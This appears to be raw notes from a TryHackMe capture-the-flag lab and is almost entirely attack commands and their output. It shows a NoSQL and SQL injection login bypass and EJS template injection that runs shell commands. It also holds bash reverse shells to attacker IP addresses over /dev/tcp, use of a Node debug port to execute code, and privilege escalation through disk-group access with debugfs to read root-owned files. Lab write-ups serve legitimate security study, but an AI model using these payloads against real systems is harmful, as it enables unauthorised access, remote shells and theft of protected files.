X-Powered-By: Express

password[$ne]=x

' OR '1'='1
admin'--

  users.findOne({
    username: req.body.username,
    password: req.body.password
  })
  
  
 password = { $ne: "x" }
 
   your request effectively changes it into:

  users.findOne({
    username: "attendant",
    password: { $ne: "x" }
  })

username=attendant&password[$ne]=x
username=attendant&password%5B%24ne%5D=x

===

Dear <%= 7 * 7 %>, your Byte Lotus cabana is confirmed.


<pre><%= process.getBuiltinModule('child_process').execSync('ls -la /home').toString() %></pre>


<pre><%= process.getBuiltinModule('child_process').execSync('cat /home/poolside/user.txt').toString() %></pre>


shell

<pre><%= process.getBuiltinModule('child_process').execSync("/bin/bash -c '/bin/bash -i >& /dev/tcp/10.130.65.43/4444>&1'").toString() %></pre>

<% process.getBuiltinModule('child_process').exec("/bin/bash -c '/bin/bash -i >& /dev/tcp/10.130.65.4/4321 0>&1'"); %>

Shell started

ps -e -o pid,ppid,state,command



ss -tuln



pgrep -af 'processor.js|telemetry'
ps -eo user,pid,ppid,args | grep -E 'processor.js|telemetry' | grep -v grep

PID=1234
tr '\0' ' ' < /proc/$PID/cmdline
ls -l /proc/$PID/cwd /proc/$PID/exe
ps -o user,pid,ppid,lstart,args -p "$PID"

systemctl list-units --type=service --all | grep -Ei 'pipeline|telemetry|lotus'
systemctl list-unit-files | grep -Ei 'pipeline|telemetry|lotus'

systemctl status SERVICE_NAME --no-pager
systemctl cat SERVICE_NAME
===

/etc/systemd/system/lotus-telemetry.service

poolside@tryhackme-2404:/opt$ node inspect 127.0.0.1:9229
connecting to 127.0.0.1:9229 ... ok
debug> repl
Press Ctrl+C to leave debug repl
> process.getuid()
995
> process.getgid()
995
> process.cwd()
'/opt/pipelinesvc/telemetry'
> process.getBuiltinModule('fs').readdirSync('/home/pipelinesvc')
[ '.bash_logout', '.bashrc', '.profile' ]
> process.getBuiltinModule('fs').readdirSync('/home/pipelinesvc')
[ '.bash_logout', '.bashrc', '.profile' ]
> process.getBuiltinModule('child_process').execSync('id').toString()
'uid=995(pipelinesvc) gid=995(pipelinesvc) groups=995(pipelinesvc),6(disk)\n'
> process.getBuiltinModule('child_process').execSync('sudo -n -l 2>&1 || true').toString()
'sudo: a password is required\n'


 process.getBuiltinModule('child_process').execSync('lsblk -o NAME,FSTYPE,SIZE,MOUNTPOINTS').toString()
'NAME        FSTYPE     SIZE MOUNTPOINTS\n' +
  'loop0       squashfs  28.2M /snap/amazon-ssm-agent/13009\n' +
  'loop1       squashfs  28.4M /snap/amazon-ssm-agent/13349\n' +
  'loop2       squashfs 105.2M /snap/core/17292\n' +
  'loop3       squashfs  55.3M /snap/core18/1885\n' +
  'loop4       squashfs    64M /snap/core20/2379\n' +
  'loop5       squashfs  74.2M /snap/core22/1621\n' +
  'loop6       squashfs  63.8M /snap/core20/2866\n' +
  'loop7       squashfs    74M /snap/core22/2411\n' +
  'loop8       squashfs  91.9M /snap/lxd/38688\n' +
  'loop9       squashfs  91.9M /snap/lxd/29619\n' +
  'nvme1n1                  1G \n' +
  'nvme0n1                 20G \n' +
  '└─nvme0n1p1 ext4        20G /\n'
> process.getBuiltinModule('child_process').execSync("ls -l /dev/sd* /dev/vd* /dev/nvme* /dev/mapper/* 2>/dev/null || true").toString()
'crw------- 1 root root  10, 236 Aug  2 16:01 /dev/mapper/control\n' +
  'crw------- 1 root root 241,   0 Aug  2 16:01 /dev/nvme0\n' +
  'brw-rw---- 1 root disk 259,   1 Aug  2 16:01 /dev/nvme0n1\n' +
  'brw-rw---- 1 root disk 259,   2 Aug  2 16:01 /dev/nvme0n1p1\n' +
  'crw------- 1 root root 241,   1 Aug  2 16:01 /dev/nvme1\n' +
  'brw-rw---- 1 root disk 259,   0 Aug  2 16:01 /dev/nvme1n1\n'
  
  
process.getBuiltinModule('child_process').execSync(
  "/usr/sbin/debugfs -R 'cat /root/root.txt' /dev/nvme0n1p1 2>/dev/null"
).toString()


process.getBuiltinModule('child_process').execSync("/usr/sbin/debugfs -R 'cat /root/root.txt' /dev/nvme0n1p1 2>/dev/null").toString()

process.getBuiltinModule('child_process').execFileSync('/usr/sbin/debugfs', ['-R', 'head -7 /root/root.txt', '/dev/nvme0n1p1'], { encoding: 'utf8' })

second shell 

process.getBuiltinModule('child_process').exec("/bin/bash -c '/bin/bash -i >& /dev/tcp/10.130.65.43/4445 0>&1'")


==

id
uid=995(pipelinesvc) gid=995(pipelinesvc) groups=995(pipelinesvc),6(disk)

Members of disk can often access raw storage devices Because those devices contain all files including /root and /etc/shadow

lsblk -o NAME,FSTYPE,SIZE,MOUNTPOINTS

pipelinesvc@tryhackme-2404:~$ lsblk -o NAME,FSTYPE,SIZE,MOUNTPOINTS
NAME        FSTYPE     SIZE MOUNTPOINTS
loop0       squashfs  28.2M /snap/amazon-ssm-agent/13009
loop1       squashfs  28.4M /snap/amazon-ssm-agent/13349
loop2       squashfs 105.2M /snap/core/17292
loop3       squashfs  55.3M /snap/core18/1885
loop4       squashfs    64M /snap/core20/2379
loop5       squashfs  74.2M /snap/core22/1621
loop6       squashfs  63.8M /snap/core20/2866
loop7       squashfs    74M /snap/core22/2411
loop8       squashfs  91.9M /snap/lxd/38688
loop9       squashfs  91.9M /snap/lxd/29619
nvme1n1                  1G 
nvme0n1                 20G 
└─nvme0n1p1 ext4        20G /


Physical disk	/dev/nvme0n1
Root partition	/dev/nvme0n1p1
Filesystem	ext4
Mount point	/

direct confirmation
findmnt -no SOURCE,FSTYPE /

Confirm access to the block device
ls -l /dev/nvme0n1 /dev/nvme0n1p1

pipelinesvc@tryhackme-2404:~$ ls -l /dev/nvme0n1 /dev/nvme0n1p1
brw-rw---- 1 root disk 259, 1 Aug  2 16:01 /dev/nvme0n1
brw-rw---- 1 root disk 259, 2 Aug  2 16:01 /dev/nvme0n1p1

b          block device
root       owning user
disk       owning group
rw         group members can read and write

pipelinesvc@tryhackme-2404:~$ test -r /dev/nvme0n1p1 && echo readable
readable
pipelinesvc@tryhackme-2404:~$ test -w /dev/nvme0n1p1 && echo writable
writable
pipelinesvc@tryhackme-2404:~$ 

/usr/sbin/debugfs -R 'ls -l /root' /dev/nvme0n1p1

/usr/sbin/debugfs -R 'cat /root/root.txt' /dev/nvme0n1p1
